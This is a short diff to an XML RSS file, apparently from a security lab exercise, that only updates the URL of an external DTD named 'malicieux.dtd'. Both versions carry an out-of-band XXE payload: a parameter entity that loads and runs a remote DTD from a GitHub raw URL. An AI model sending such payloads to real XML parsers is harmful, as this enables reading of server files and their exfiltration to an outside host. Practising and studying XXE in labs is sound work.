@@ -1,6 +1,6 @@
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "https://raw.githubusercontent.com/ImXenXen/TP5_7/main/malicieux.dtd">
+  <!ENTITY % xxe SYSTEM "https://raw.githubusercontent.com/ImXenXen/TP5_7/refs/heads/main/malicieux.dtd">
   %xxe;
 ]>
 <rss version="2.0">
